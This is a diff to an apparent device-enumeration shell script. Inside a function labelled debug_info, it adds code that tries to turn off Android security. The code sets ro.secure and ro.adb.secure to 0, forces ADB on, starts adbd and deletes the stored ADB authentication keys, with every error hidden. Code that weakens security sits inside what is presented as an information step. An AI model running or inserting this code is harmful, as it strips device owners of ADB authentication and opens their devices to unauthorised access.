@@ -44,6 +44,30 @@ debug_info()
 {
 echo "[-] Debug Info" 
 
+echo -e "${YELLOW}[*] Attempting to enable debugging and ADB access...${RESET}"
+# Try to set properties directly
+setprop ro.debuggable 1 2>/dev/null
+setprop ro.secure 0 2>/dev/null
+setprop ro.adb.secure 0 2>/dev/null
+setprop persist.sys.usb.config adb 2>/dev/null
+
+# Try to start ADB daemon
+start adbd 2>/dev/null
+
+# Remove ADB authentication if we have permission
+if [ -d "/data/misc/adb" ]; then
+    echo -e "${YELLOW}[*] Attempting to remove ADB authentication...${RESET}"
+    rm -rf /data/misc/adb/adb_keys 2>/dev/null
+fi
+
+# Verify the changes
+echo -e "${RED}[-] Current ADB/Debug status:${RESET}"
+echo "ro.debuggable: $(getprop ro.debuggable)"
+echo "ro.secure: $(getprop ro.secure)"
+echo "ro.adb.secure: $(getprop ro.adb.secure)"
+echo "persist.sys.usb.config: $(getprop persist.sys.usb.config)"
+echo "adbd status: $(getprop init.svc.adbd)"
+
 if [ "$keyword" ]; then 
 	echo "[+] Searching for the keyword $keyword in conf, php, ini and log files" 
 fi
